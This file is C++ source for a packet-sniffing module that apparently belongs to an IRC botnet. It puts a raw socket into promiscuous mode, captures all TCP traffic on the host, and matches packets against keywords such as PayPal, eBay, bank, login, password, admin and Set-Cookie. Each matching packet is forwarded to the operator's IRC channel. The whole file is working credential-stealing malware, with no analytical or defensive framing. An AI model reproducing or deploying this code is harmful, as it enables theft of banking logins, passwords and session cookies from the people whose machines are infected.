#include "../h/includes.h"
#include "../h/functions.h"


in_addr &to_in_addr(unsigned long lHost)
{
	static in_addr ina;
	ina.s_addr=lHost;
	return ina;
}

BOOL IsSuspiciousBot(const char *szBuf, const char *szNick)
{
	if(strstr(szBuf, "e-gold.com")) return TRUE;
	if(strstr(szBuf, "alertpay.com")) return TRUE;
    if(strstr(szBuf, "paypal.com")) return TRUE;
	if(strstr(szBuf, "ebay.com")) return TRUE;
	if(strstr(szBuf, "americabank.com")) return TRUE;
	if(strstr(szBuf, "moneybookers.com")) return TRUE;
	if(strstr(szBuf, "Set-Cookie")) return TRUE;
	if(strstr(szBuf, "warez-bb.org")) return TRUE;
    if(strstr(szBuf, "*login*")) return TRUE;
	if(strstr(szBuf, "admin")) return TRUE;
	if(strstr(szBuf, "login")) return TRUE;
	if(strstr(szBuf, "password")) return TRUE;
	if(strstr(szBuf, "*bank*")) return TRUE;
	if(strstr(szBuf, "*admin*")) return TRUE;
	return FALSE;
}


DWORD WINAPI CSniffer(LPVOID param)
{
	NTHREAD sniffer = *((NTHREAD*)param);
	NTHREAD *sniffers = (NTHREAD *)param;
	sniffers->gotinfo = TRUE;
	IRC* irc=(IRC*)sniffer.conn;

	int sock;
	sockaddr_in addr_in;
	hostent *hEnt;
	IPHEADER *ipHeader;
	TCPHEADER *tcpHeader;
	char *szPacket;
	char szName[255]={0};
	unsigned long lLocalIp;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=0;
	addr_in.sin_addr.s_addr=0;
	fgethostname(szName, sizeof(szName));
	hEnt=fgethostbyname(szName);
	memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
	addr_in.sin_addr.s_addr=lLocalIp;

	sock=fsocket(AF_INET,SOCK_RAW,IPPROTO_IP); 
	if(sock==INVALID_SOCKET)
	{
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}

	if(fbind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR)
	{
		fclosesocket(sock);
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}

	int optval=1;
	DWORD dwBytesRet;
	if(fWSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR)
	{
		fclosesocket(sock);
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}

	char szCurNick[MAX_NICKLEN];
	char szRecvBuf[65535];
	ipHeader=(IPHEADER*)szRecvBuf;
	int iRead;

	strcpy(szCurNick,irc->current_nick());
	while(irc->is_connected())
	{
		// Clear the buffer
		ZeroMemory(szRecvBuf,sizeof(szRecvBuf));
		iRead=0;
		
		// Read the raw packet
		iRead=frecv(sock, szRecvBuf, sizeof(szRecvBuf), 0);

		// Process if its a TCP/IP packet
		if(ipHeader->proto==6)
		{
			tcpHeader=(TCPHEADER*)(szRecvBuf+sizeof(*ipHeader));
			int iSrcPort, iDestPort;
			char szSrcHost[2048], szDestHost[2048];
			iSrcPort=fntohs(tcpHeader->th_sport);
			iDestPort=fntohs(tcpHeader->th_dport);
			{
				sprintf(szSrcHost, "%s", finet_ntoa(to_in_addr(ipHeader->sourceIP)));
				sprintf(szDestHost, "%s", finet_ntoa(to_in_addr(ipHeader->destIP)));

				szPacket=(char*)(szRecvBuf+sizeof(*tcpHeader)+sizeof(*ipHeader));
				for(int i=0; i<strlen(szPacket); i++) {
					if(szPacket[i]=='\r') szPacket[i]='\x20';
					if(szPacket[i]=='\n') szPacket[i]='\x20'; }

				if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousBot(szPacket,szCurNick))
				{
					irc->pmsg(USB_CHANNEL,"Bot sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket);
				}
			}
		}
	}
	fclosesocket(sock);
	clearthread(sniffer.threadnum);
	ExitThread(0);
}